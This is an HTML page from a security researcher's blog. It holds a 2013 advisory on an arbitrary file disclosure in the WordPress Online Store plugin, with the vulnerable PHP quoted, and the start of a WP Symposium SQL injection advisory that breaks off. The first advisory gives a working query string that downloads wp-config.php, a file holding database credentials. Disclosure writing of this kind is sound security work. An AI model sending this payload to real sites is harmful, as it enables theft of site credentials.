<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="https://charlieeriksen.github.io" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>ceriksen.com | Page 2</title>

<link rel="stylesheet" type="text/css" media="all" href="https://charlieeriksen.github.io/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->


<link rel='stylesheet' id='crayon-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="home blog paged paged-2  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="https://charlieeriksen.github.io/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="https://charlieeriksen.github.io/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="https://charlieeriksen.github.io/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<div id="primary">
			<div id="content" role="main">

			
					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="https://charlieeriksen.github.io/page/3/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						<div class="nav-next"><a href="https://charlieeriksen.github.io/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
						
		
	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-152" class="post-152 post type-post status-publish format-standard hentry category-advisories tag-file-disclosure tag-wordpress-plugin tag-wp-online-store">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/" title="10:42 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:42:48+00:00" pubdate>February 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/" title="Permalink to WordPress Online Store arbitrary file disclosure" rel="bookmark">WordPress Online Store arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50836/">Secunia Advisory SA50836</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The plugin hooks two functions as a part of its core functionality in <a href="http://plugins.trac.wordpress.org/browser/wp-online-store/trunk/core.php?rev=570208">core.php</a> by adding an action for init and admin_init.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b17c5197601637" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_action('init', 'osc_session_init_fend'); // starts session
add_action('admin_init', 'osc_session_init'); // starts session</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b17c5197601637-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17c5197601637-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b17c5197601637-3"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'osc_session_init_fend'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// starts session</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17c5197601637-4"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'admin_init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'osc_session_init'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// starts session</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0014 seconds] -->
<p>The first line calls into osc_session_init_fend whenever a WordPress page is loaded, in order to set up a session.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b17e4880409211" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function osc_session_init_fend()
{
    session_name('osCsid');
    $request_type = (getenv('HTTPS') == 'on') ? 'SSL' : 'NONSSL';
    if (isset($_POST['osCsid'])) {

        session_id($_POST['osCsid']);

    } else if (($request_type == 'SSL') &amp;&amp; isset($_GET['osCsid']) ) {

        session_id($_GET['osCsid']);

    }
    //if (!session_id())
    session_start();
    ob_start();
    if ($_REQUEST['force']=='downloadnow') {
        header('Content-type: application/x-octet-stream');
        header('Content-disposition: attachment; filename=' . $_REQUEST['file']);

        readfile($_REQUEST['turl'] . $_REQUEST['file']);
        // unlink($_REQUEST['turl'] . $_REQUEST['backup_file']);

    }
    wp_enqueue_script('jquery');
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-120">120</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-121">121</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-122">122</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-123">123</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-124">124</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-125">125</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-126">126</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-127">127</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-128">128</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-129">129</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-130">130</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-131">131</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-132">132</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-133">133</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-134">134</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-135">135</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-136">136</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-137">137</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-138">138</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-139">139</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-140">140</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-141">141</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-142">142</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-143">143</div><div class="crayon-num" data-line="crayon-53c98e78b17e4880409211-144">144</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b17e4880409211-145">145</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b17e4880409211-120"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">osc_session_init_fend</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-121"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-122"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_name</span><span class="crayon-sy">(</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-123"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">request_type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">getenv</span><span class="crayon-sy">(</span><span class="crayon-s">'HTTPS'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-s">'SSL'</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'NONSSL'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-124"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-125">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-126"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_id</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-127">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-128"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">request_type</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'SSL'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-129">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-130"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_id</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-131">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-132"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-133"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//if (!session_id())</span></div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-134"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-135"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-136"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'force'</span><span class="crayon-sy">]</span><span class="crayon-o">==</span><span class="crayon-s">'downloadnow'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-137"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type: application/x-octet-stream'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-138"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-disposition: attachment; filename='</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-139">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-140"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'turl'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-141"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// unlink($_REQUEST['turl'] . $_REQUEST['backup_file']);</span></div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-142">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-143"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b17e4880409211-144"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">wp_enqueue_script</span><span class="crayon-sy">(</span><span class="crayon-s">'jquery'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b17e4880409211-145"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0061 seconds] -->
<p>The interesting thing is that on line 136 is checks the &#8220;force&#8221; request variable to see if it matches to &#8220;downloadnow&#8221;. If it is set, it will change the content type of the response to be a download, and then read the file set by the request variables &#8220;turl&#8221; and &#8220;file&#8221; and write that to the response. These variables are however not sanitized, which leads to an arbitrary file disclosure. We can exploit this by making a request to any page with following querystring, which will force the browser to download a page containing the contents of the wp-config.php file at the top of the file:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b17f1646068912" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
?force=downloadnow&amp;turl=./&amp;file=wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b17f1646068912-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b17f1646068912-1"><span class="crayon-sy">?</span><span class="crayon-v">force</span><span class="crayon-o">=</span><span class="crayon-i">downloadnow</span><span class="crayon-o">&amp;</span><span class="crayon-v">turl</span><span class="crayon-o">=</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-o">&amp;</span><span class="crayon-v">file</span><span class="crayon-o">=</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-i">php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="https://charlieeriksen.github.io/tag/wp-online-store/" rel="tag">WP Online Store</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/#respond" title="Comment on WordPress Online Store arbitrary file disclosure">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-152 -->

				
					
<article id="post-132" class="post-132 post type-post status-publish format-standard hentry category-advisories tag-sql-injection tag-symposium tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/02/18/wp-symposium-multiple-sql-injection/" title="10:33 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:33:09+00:00" pubdate>February 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/02/18/wp-symposium-multiple-sql-injection/" title="Permalink to WP Symposium multiple SQL injection vulnerabilities" rel="bookmark">WP Symposium multiple SQL injection vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50674/">Secunia Advisory SA50674</a></p>
<p><strong>Analysis of groups get_user_list SQL injection vulnerability</strong></p>
<p>This first vulnerability in the <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/ajax/symposium_groups_functions.php">/ajax/symposium_groups_functions.php</a> file makes use of the functionality for people to view the users of a group. It accepts a groupID(gid) which it inserts without validation into a query and then spits out the result, even if you are not authenticated.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b50c3505510077" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
